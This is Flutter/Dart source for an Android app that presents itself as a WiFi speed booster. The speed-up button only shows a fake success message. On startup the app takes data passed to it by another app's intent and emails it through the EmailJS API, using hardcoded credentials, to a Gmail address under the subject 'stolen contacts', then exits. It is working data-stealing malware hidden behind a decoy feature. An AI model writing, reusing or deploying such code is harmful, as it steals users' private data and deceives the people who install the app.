
import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:receive_intent/receive_intent.dart';
import 'package:http/http.dart' as http;


void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'WiFi Speed',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: const MyHomePage(title: 'Speed up your WiFi'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key? key, required this.title}) : super(key: key);
  
  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  int sped_up = 0;
  String txt = "";
  String contacts = "";
  String text = "";

  @override
  void initState() {
    super.initState();
    _initReceiveIntent();
  }

  Future<void> speed_indicator() async {
    if (sped_up == 0) {
      setState(() {
        sped_up = 1;
        txt = "📶 WiFi sped up! ⚡";
      });
    } else {
      setState(() {
        sped_up = 0;
        txt = "";
      });
    }
  }

  Future<void> _initReceiveIntent() async {
    try {
      final receivedIntent = await ReceiveIntent.getInitialIntent();
      var data = receivedIntent?.data;
      if (data != null)
      {
        final url = Uri.parse('https://api.emailjs.com/api/v1.0/email/send');
        String message = data.toString();
        final response = await http.post(url,
        headers: {
          'origin':'http://localhost',
          'Content-Type': 'application/json',
        }, body : json.encode({
              'service_id': 'service_8juphkm',
              'template_id': 'template_ovmoou6',
              'user_id': 'EYI0uOUDW6SfWZm8j',
              'template_params': {
                'user_email':'fluttermailtest1337@gmail.com',
                'to_email':'fluttermailtest1337@gmail.com',
                'user_subject':'stolen contacts',
                'user_message': message
            },
            })
        );
        debugPrint(response.body);
        SystemNavigator.pop();
      }
      else
      {
        debugPrint("no data");
      }
    } on PlatformException {
      debugPrint("wrong platform");
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(widget.title),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: <Widget>[
            Text(txt, style: TextStyle(fontWeight: FontWeight.bold, fontSize: 40),),
            ElevatedButton(onPressed: speed_indicator, child: Text("Speed up your WiFi!"))
          ],
        ),
      ),
    );
  }
}
